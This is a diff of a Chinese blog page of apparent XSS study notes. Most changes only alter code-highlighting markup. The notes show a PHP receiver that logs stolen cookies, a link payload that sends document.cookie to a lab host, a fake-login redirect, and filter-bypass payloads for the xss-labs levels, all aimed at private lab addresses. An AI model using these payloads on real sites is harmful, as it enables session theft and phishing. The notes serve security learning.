@@ -488,7 +488,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.3k
+                    1.2k
                 </div>
                 
 
@@ -516,7 +516,7 @@
 <li><p>注入类</p></li>
 <li><p>代码</p></li>
 </ul>
-<pre class="php+html"><code>content=&lt;button&gt;快来点我&lt;/button&gt;</code></pre>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">content&#x3D;&lt;button&gt;快来点我&lt;&#x2F;button&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208242128200.png"
@@ -532,17 +532,16 @@ alt="image-20220824212859062" />
 <li>在超链接中</li>
 </ul></li>
 </ul>
-<div class="sourceCode" id="cb2"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">&quot;javascript:alert(1)&quot;</span><span class="ot"> </span><span class="dt">&gt;</span>点击有惊喜<span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(1)<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>点击有惊喜<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li>iframe 框架</li>
 </ul>
-<pre class="php+html"><code>&lt;iframe src=&quot;https://www.taobao.com&quot;/&gt;</code></pre>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;www.taobao.com&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>钓鱼网站、</p>
-<pre class="php+html"><code>echo &quot;&lt;script&gt;document.write(&#39;你的用户名不正确，请重新登录&#39;);setTimeout(function()&#123;
-    location.href= &#39;https://www.taobao.com&#39;;
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">echo &quot;&lt;script&gt;document.write(&#39;你的用户名不正确，请重新登录&#39;);setTimeout(function()&#123;
+    location.href&#x3D; &#39;https:&#x2F;&#x2F;www.taobao.com&#39;;
 &#125;,3000);
-&lt;/script&gt;&quot;;</code></pre>
+&lt;&#x2F;script&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>渗透步骤
 <ul>
@@ -565,8 +564,7 @@ alt="image-20220825170727204" />
 <ul>
 <li>132 获取130机器cookie</li>
 </ul>
-<div class="sourceCode" id="cb5"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="va">$author</span> <span class="op">=</span> <span class="va">$_SESSION</span>[<span class="st">&#39;username&#39;</span>]<span class="ot">;</span>    <span class="co">// 用成了post</span></span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$author</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 用成了post</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li>文章中插入js代码</li>
 </ul>
@@ -591,7 +589,7 @@ alt="获取cookie" />
 <ul>
 <li>发帖功能存在XSS漏洞</li>
 </ul>
-<pre class="php+html"><code>&lt;BUtton onclick = &quot;alert(documnet.cookie)&quot;&gt;点我有惊喜&lt;/BUtton&gt;</code></pre>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;BUtton onclick &#x3D; &quot;alert(documnet.cookie)&quot;&gt;点我有惊喜&lt;&#x2F;BUtton&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li>blue-lotus 安装: <a
 target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41683305/article/details/114282690">参考</a>
@@ -615,11 +613,10 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102325463.png"
 alt="image-20220910232531377" />
 <figcaption aria-hidden="true">image-20220910232531377</figcaption>
 </figure>
-<div class="sourceCode" id="cb7"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>#在xampp中的bin 文件夹启动mysql</span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> mysql;</span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="kw">update</span> <span class="fu">user</span> <span class="kw">set</span> <span class="kw">password</span><span class="op">=</span><span class="kw">password</span>(<span class="st">&#39;123&#39;</span>) <span class="kw">where</span> <span class="fu">user</span><span class="op">=</span><span class="st">&#39;root&#39;</span> <span class="kw">and</span> host<span class="op">=</span><span class="st">&#39;localhost&#39;</span>;</span>
-<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="kw">flush</span> <span class="kw">privileges</span>;</span></code></pre></div>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#在xampp中的bin 文件夹启动mysql</span>
+<span class="token keyword">use</span> mysql<span class="token punctuation">;</span>
+<span class="token keyword">update</span> <span class="token keyword">user</span> <span class="token keyword">set</span> password<span class="token operator">=</span>password<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span> <span class="token keyword">where</span> <span class="token keyword">user</span><span class="token operator">=</span><span class="token string">'root'</span> <span class="token operator">and</span> host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">;</span>
+flush <span class="token keyword">privileges</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>回调的代码出错：</li>
 </ul>
@@ -632,29 +629,27 @@ alt="image-20220911152122560" />
 <ul>
 <li>构建xss</li>
 </ul>
-<div class="sourceCode" id="cb8"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">#132 xssReceive.php</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ot">?</span>php</span>
-<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="va">$ipaddr</span> <span class="op">=</span> <span class="va">$_SERVER</span>[<span class="st">&#39;REMOTE_ADDR&#39;</span>]<span class="ot">;</span></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="va">$url</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;url&#39;</span>]<span class="ot">;</span></span>
-<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="va">$_COOKIE</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;cookie&#39;</span>]</span>
-<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="va">$conn</span> <span class="op">=</span> <span class="kw">new</span> <span class="bu">mysqli</span>(<span class="st">&#39;127.0.0.1&#39;</span><span class="ot">,</span><span class="st">&#39;root&#39;</span><span class="ot">,</span> <span class="st">&#39;123456&#39;</span><span class="ot">,</span><span class="st">&#39;learn&#39;</span>) <span class="op">or</span> <span class="cf">die</span>(<span class="st">&#39;数据库连接不成功.&#39;</span>)<span class="ot">;</span></span>
-<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="va">$conn</span>-&gt;set_charset(<span class="st">&quot;utf-8&quot;</span>)<span class="ot">;</span></span>
-<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="va">$sql</span> <span class="op">=</span> <span class="st">&quot;insert into xssdata(ipaddr,url,cookie,createtime) value(&#39;</span><span class="va">$ipaddr</span><span class="st">&#39;, &#39;</span><span class="va">$url</span><span class="st">&#39;, &#39;</span><span class="va">$cookie</span><span class="st">&#39;, now())&quot;</span><span class="ot">;</span></span>
-<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="va">$conn</span>-&gt;query(<span class="va">$sql</span>)<span class="ot">;</span></span>
-<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="co">// echo &quot;&lt;script&gt;history.back();&lt;/script&gt;&quot;</span></span>
-<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="st">&quot;&lt;script&gt;loaction.href=&#39;http://www.woniunote.com/&#39;&lt;/script&gt;&quot;</span></span>
-<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="co">// http://192.168.104.132/xss/xssReceive.php?url=</span></span></code></pre></div>
-<div class="sourceCode" id="cb9"><pre
-class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>a href<span class="op">=</span><span class="st">&#39;javascript:loacation.href=&quot;http://192.168.104.132/xss/xssReceive.php?url=“+location.href+”&amp;cookie=&quot;+document.cookie&#39;</span><span class="op">&gt;</span></span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>img src<span class="op">=</span><span class="st">&quot;http://192.168.104.132/xss/01.png&quot;</span><span class="op">/&gt;</span></span>
-<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>a<span class="op">&gt;</span></span>
-<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>a href<span class="op">=</span>\<span class="st">&#39; javascript:loacation.href=&quot;http://192.168.104.132/xss/xssReceive.php?url=&quot;%2Blocation.href%2B&quot;%26cookie=&quot; %2Bdocument.cookie </span><span class="sc">\&#39;</span><span class="st">&gt;</span></span>
-<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>img src<span class="op">=</span><span class="st">&quot;http://192.168.104.132/xss/01.png&quot;</span><span class="op">/&gt;</span></span>
-<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>a<span class="op">&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">#132 xssReceive.php
+
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$ipaddr</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$_COOKIE</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span>
+
+<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'learn'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'数据库连接不成功.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into xssdata(ipaddr,url,cookie,createtime) value('<span class="token interpolation"><span class="token variable">$ipaddr</span></span>', '<span class="token interpolation"><span class="token variable">$url</span></span>', '<span class="token interpolation"><span class="token variable">$cookie</span></span>', now())"</span><span class="token punctuation">;</span>
+<span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// echo "&lt;script>history.back();&lt;/script>"</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>loaction.href='http://www.woniunote.com/'&lt;/script>"</span>
+<span class="token comment">// http://192.168.104.132/xss/xssReceive.php?url=</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">'javascript:loacation.href="http://192.168.104.132/xss/xssReceive.php?url=“+location.href+”&amp;cookie="+document.cookie'</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://192.168.104.132/xss/01.png"</span><span class="token operator">/</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
+<span class="token operator">&lt;</span>a href<span class="token operator">=</span>\' javascript<span class="token operator">:</span>loacation<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://192.168.104.132/xss/xssReceive.php?url="</span><span class="token operator">%</span>2Blocation<span class="token punctuation">.</span>href<span class="token operator">%</span>2B<span class="token string">"%26cookie="</span> <span class="token operator">%</span>2Bdocument<span class="token punctuation">.</span>cookie \'<span class="token operator">></span>
+    <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://192.168.104.132/xss/01.png"</span><span class="token operator">/</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111539634.png"
@@ -740,8 +735,7 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120004239.png"
 alt="image-20220912000415096" />
 <figcaption aria-hidden="true">image-20220912000415096</figcaption>
 </figure>
-<div class="sourceCode" id="cb10"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>http://192.168.104.130/xss-labs/level1.php?name=<span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="st">&#39;1&#39;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://192.168.104.130/xss-labs/level1.php?name=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li>level-2</li>
 </ul>
@@ -751,9 +745,8 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120021466.png"
 alt="image-20220912002111411" />
 <figcaption aria-hidden="true">image-20220912002111411</figcaption>
 </figure>
-<div class="sourceCode" id="cb11"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>#闭合双引号和尖括号</span>
-<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>&quot;&gt;<span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="st">&#39;1&#39;</span>)<span class="op">&lt;</span>script<span class="op">&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">#闭合双引号和尖括号
+"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert('1')<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <ul>
 <li>level-3</li>
 </ul>
@@ -796,8 +789,7 @@ alt="image-20220912112716944" />
 <li>屏蔽href: 大小写绕过</li>
 </ul></li>
 </ul>
-<div class="sourceCode" id="cb12"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>&quot;&gt; <span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> hRef </span><span class="op">=</span><span class="st">javascript:alert(1)</span><span class="ot"> </span><span class="er">/</span><span class="ot">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">"> &lt;a hRef =javascript:alert(1) /a><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121136620.png"
@@ -810,8 +802,7 @@ alt="image-20220912113640527" />
 <li>只过滤一次</li>
 </ul></li>
 </ul>
-<div class="sourceCode" id="cb13"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>&quot;&gt; <span class="dt">&lt;</span><span class="kw">scRScriptIpt</span><span class="dt">&gt;</span>alert(1)<span class="dt">&lt;/</span><span class="kw">ScriScriptpt</span><span class="dt">&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scRScriptIpt</span><span class="token punctuation">></span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ScriScriptpt</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li>level-8
 <ul>
@@ -830,10 +821,10 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333191.png"
 alt="image-20220912133349148" />
 <figcaption aria-hidden="true">image-20220912133349148</figcaption>
 </figure>
-<pre><code> &lt;a hRef =javascript:alert(1) /a&gt;
+<pre class="line-numbers language-none"><code class="language-none"> &lt;a hRef &#x3D;javascript:alert(1) &#x2F;a&gt;
 javascript:alert(1) 
 html encode:
-&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></pre>
+&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>level-9
 <ul>
@@ -846,24 +837,21 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121354347.png"
 alt="image-20220912135434273" />
 <figcaption aria-hidden="true">image-20220912135434273</figcaption>
 </figure>
-<div class="sourceCode" id="cb15"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>javascript:alert(1)//http://www.baidu.com</span>
-<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a># 保留http://，其余编码</span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">javascript:alert(1)//http://www.baidu.com
+# 保留http://，其余编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <ul>
 <li>level-10</li>
 </ul>
-<div class="sourceCode" id="cb16"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a># 测试</span>
-<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>&#39;&#39; &#39; &gt;<span class="er">&lt;</span> script onclick</span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"># 测试
+'' ' >&lt; script onclick<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121425836.png"
 alt="三个隐藏标签" />
 <figcaption aria-hidden="true">三个隐藏标签</figcaption>
 </figure>
-<div class="sourceCode" id="cb17"><pre
-class="sourceCode css"><code class="sourceCode css"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a># 检测试探隐藏input</span>
-<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>t_link=&quot; type=&#39;text&#39;<span class="op">&gt;</span><span class="er">//&amp;t_history=&quot; type=&#39;text&#39;&gt;//&amp;t_sort=&quot; type=&#39;text&#39;&gt;//</span></span></code></pre></div>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"># 检测试探隐藏input
+t_link=<span class="token string">" type='text'>//&amp;t_history="</span> type=<span class="token string">'text'</span>>//&amp;t_sort=" type=<span class="token string">'text'</span>>//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121638743.png"
@@ -885,15 +873,14 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121656755.png"
 alt="image-20220912165658683" />
 <figcaption aria-hidden="true">image-20220912165658683</figcaption>
 </figure>
-<pre><code>t_link=&quot; type=&#39;text&#39;&gt;//&amp;t_history=&quot; type=&#39;text&#39;&gt;//&amp;t_sort=&quot; type=&#39;text&#39;&gt;//&amp;t_ref=&quot; type=&#39;text&#39;&gt;//</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">t_link&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;&amp;t_history&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;&amp;t_sort&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;&amp;t_ref&#x3D;&quot; type&#x3D;&#39;text&#39;&gt;&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121657058.png"
 alt="image-20220912165738998" />
 <figcaption aria-hidden="true">image-20220912165738998</figcaption>
 </figure>
-<div class="sourceCode" id="cb19"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;//</span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">" type='text' onclick='javascript:alert(1)'>//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121714232.png"
@@ -952,8 +939,7 @@ alt="img" />
 <ul>
 <li>level-15</li>
 </ul>
-<div class="sourceCode" id="cb20"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>http://192.168.104.130/xss-labs/level15.php?src=&#39;level1.php?name=<span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">1</span><span class="ot"> onerror</span><span class="op">=</span><span class="st">alert(/xss/)</span><span class="dt">&gt;</span>&#39;</span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://192.168.104.130/xss-labs/level15.php?src='level1.php?name=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122025344.png"
@@ -963,16 +949,14 @@ alt="image-20220912202525209" />
 <ul>
 <li>level-16</li>
 </ul>
-<div class="sourceCode" id="cb21"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a># 试探</span>
-<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>“ ‘ <span class="er">&lt;</span>&gt; script onerror  onclick</span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"># 试探
+“ ‘ &lt;> script onerror  onclick<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <blockquote>
 <ul>
 <li>空格可以使用%0a和%0d替换</li>
 </ul>
 </blockquote>
-<div class="sourceCode" id="cb22"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="er">%0asrc</span><span class="op">=</span><span class="st">1%0donerror</span><span class="er">=</span><span class="st">alert(</span><span class="er">&#39;</span><span class="st">xss</span><span class="er">&#39;</span><span class="st">)</span><span class="dt">&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;img%0asrc=1%0donerror=alert('xss')><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122344830.png"
@@ -988,8 +972,7 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355653.png"
 alt="分析源码" />
 <figcaption aria-hidden="true">分析源码</figcaption>
 </figure>
-<div class="sourceCode" id="cb23"><pre
-class="sourceCode html"><code class="sourceCode html"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>http://192.168.104.130/xss-labs/level18.php?arg01=a<span class="er">&amp;</span>arg02=b onmouseover = alert(1)</span></code></pre></div>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://192.168.104.130/xss-labs/level18.php?arg01=a&amp;arg02=b onmouseover = alert(1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355954.png"
@@ -1621,7 +1604,7 @@ alt="image-20220912235558854" />
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">235.4k</span>&nbsp;字
+                class="white-color">230.3k</span>&nbsp;字
             
             
             
